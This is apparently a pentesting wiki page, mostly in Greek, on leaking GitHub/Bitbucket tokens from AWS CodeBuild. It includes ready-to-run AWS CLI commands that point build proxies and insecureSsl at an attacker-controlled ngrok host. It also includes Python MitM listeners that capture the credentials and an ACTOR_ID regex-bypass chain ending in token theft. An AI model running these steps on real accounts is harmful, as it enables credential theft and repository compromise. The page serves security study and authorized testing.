# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Ανάκτηση Github/Bitbucket Configured Tokens

Πρώτα, έλεγξε αν υπάρχουν source credentials configured που θα μπορούσες να leak:
```bash
aws codebuild list-source-credentials
```
### Μέσω Docker Image

Αν διαπιστώσετε ότι έχει ρυθμιστεί αυθεντικοποίηση, π.χ. προς το Github, στον λογαριασμό, μπορείτε να **exfiltrate** αυτή την **access** (**GH token or OAuth token**) κάνοντας το Codebuild να **use a specific Docker image** για να τρέξει το build του project.

Για αυτόν τον σκοπό μπορείτε να **create a new Codebuild project** ή να αλλάξετε το **environment** ενός υπάρχοντος για να ορίσετε την **Docker image**.

Η Docker image που μπορείτε να χρησιμοποιήσετε είναι [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Πρόκειται για μια πολύ βασική Docker image που θα ορίσει τις **env variables `https_proxy`**, **`http_proxy`** και **`SSL_CERT_FILE`**. Αυτό θα σας επιτρέψει να υποκλέψετε το μεγαλύτερο μέρος της κίνησης του host που υποδεικνύεται στα **`https_proxy`** και **`http_proxy`** και να εμπιστευτείτε το SSL CERT που υποδεικνύεται στο **`SSL_CERT_FILE`**.

1. **Create & Upload your own Docker MitM image**
- Ακολουθήστε τις οδηγίες του repo για να ορίσετε τη διεύθυνση IP του proxy σας και το SSL cert και **build the docker image**.
- **DO NOT SET `http_proxy`** ώστε να μην υποκλέπτονται αιτήματα προς το metadata endpoint.
- Μπορείτε να χρησιμοποιήσετε **`ngrok`** όπως `ngrok tcp 4444` για να ορίσετε τον proxy στον host σας
- Μόλις έχετε τη Docker image χτισμένη, **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
- Δημιουργήστε ένα **new Codebuild project** ή **modify** το environment ενός υπάρχοντος.
- Ορίστε το project να χρησιμοποιεί την **previously generated Docker image**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- Όπως υποδεικνύει το **Github repo** μπορείτε να χρησιμοποιήσετε κάτι σαν:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> Η **έκδοση του mitmproxy που χρησιμοποιήθηκε ήταν 9.0.1**, αναφέρθηκε ότι με την έκδοση 10 αυτό μπορεί να μην λειτουργεί.

4. **Εκτελέστε το build & capture the credentials**

- Μπορείτε να δείτε το token στην κεφαλίδα **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Αυτό μπορεί επίσης να γίνει από το aws cli με κάτι σαν
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Μέσω insecureSSL

**Codebuild** projects have a setting called **`insecureSsl`** that is hidden in the web you can only change it from the API.\
Ενεργοποιώντας την, επιτρέπει στο Codebuild να συνδεθεί στο αποθετήριο **χωρίς έλεγχο του πιστοποιητικού** που προσφέρει η πλατφόρμα.

- Πρώτα πρέπει να απαριθμήσετε την τρέχουσα διαμόρφωση με κάτι σαν:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Έπειτα, με τις συλλεγμένες πληροφορίες μπορείς να ενημερώσεις την ρύθμιση του project **`insecureSsl`** σε **`True`**. Το ακόλουθο είναι ένα παράδειγμα της ενημέρωσής μου ενός project — πρόσεξε το **`insecureSsl=True`** στο τέλος (αυτό είναι το μόνο που χρειάζεται να αλλάξεις από την συλλεγμένη διαμόρφωση).
- Επιπλέον, πρόσθεσε επίσης τις env μεταβλητές **http_proxy** και **https_proxy** που δείχνουν στο tcp ngrok σου ως εξής:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Στη συνέχεια, τρέξτε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στη θύρα που υποδεικνύουν οι μεταβλητές proxy (http_proxy και https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Τέλος, κάντε κλικ στο **Build the project**, τα **credentials** θα σταλούν **σε απλό κείμενο** (base64) στη θύρα του mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Μέσω HTTP πρωτοκόλλου~~

> [!TIP] > **This vulnerability διορθώθηκε από την AWS κάποια στιγμή την εβδομάδα της 20ής Φεβρουαρίου 2023 (νομίζω Παρασκευή). Οπότε ένας attacker δεν μπορεί να το εκμεταλλευτεί πια :)**

Ένας attacker με **elevated permissions σε ένα CodeBuild θα μπορούσε να leak το Github/Bitbucket token** που έχει ρυθμιστεί ή αν τα permissions είχαν ρυθμιστεί μέσω OAuth, το **temporary OAuth token που χρησιμοποιείται για πρόσβαση στον κώδικα**.

- Ένας attacker θα μπορούσε να προσθέσει τις environment variables **http_proxy** και **https_proxy** στο CodeBuild project που δείχνουν στη μηχανή του (για παράδειγμα `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Μετά, αλλάξτε το URL του github repo ώστε να χρησιμοποιεί HTTP αντί για HTTPS, για παράδειγμα: `http://github.com/carlospolop-forks/TestActions`
- Έπειτα, τρέξτε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στη θύρα που δείχνουν οι proxy μεταβλητές (http_proxy και https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Στη συνέχεια, κάντε κλικ στο **Build the project** ή ξεκινήστε το build από τη γραμμή εντολών:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Τέλος, τα **credentials** θα **σταλούν σε clear text** (base64) στο mitm port:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Τώρα ένας attacker θα μπορεί να χρησιμοποιήσει το token από το μηχάνημά του, να απαριθμήσει όλα τα προνόμια που έχει και να τα (ab)use πιο εύκολα από ό,τι χρησιμοποιώντας την υπηρεσία CodeBuild άμεσα.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

Λανθασμένα διαμορφωμένα CodeBuild GitHub webhooks που χρησιμοποιούν μη αγκυρωμένα `ACTOR_ID` regexes επιτρέπουν σε *untrusted* PRs να ξεκινήσουν privileged builds. Αν η allowlist είναι σαν `123456|7890123` χωρίς `^`/`$`, οποιοδήποτε ID που περιέχει μία από αυτές τις υποσυμβολοσειρές ταιριάζει. Επειδή τα GitHub user IDs είναι διαδοχικά, ένας attacker μπορεί να «τρέξει» για να εγγράψει ένα “eclipsing” ID (ένα superstring ενός trusted ID) και να ενεργοποιήσει το build.

**Exploit path**

1. Βρείτε δημόσια CodeBuild projects που εκθέτουν webhook filters και εξάγετε μια μη αγκυρωμένη `ACTOR_ID` allowlist.
2. Obtain an eclipsing GitHub ID:
- Sample the global ID counter by creating/deleting GitHub orgs (org IDs share the pool).
- Pre-stage many GitHub App manifest creations and fire the confirmation URLs when the counter is within ~100 IDs of the target to burst-register a bot ID containing the trusted substring.
3. Open a PR from the eclipsing account; the regex matches the substring and the privileged build runs.
4. Use build RCE (e.g., dependency install hooks) to dump process memory handling the GitHub credential and recover the PAT/OAuth token.
5. With the token’s `repo` scope, invite your account as collaborator/admin and push/approve malicious commits or exfiltrate secrets.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
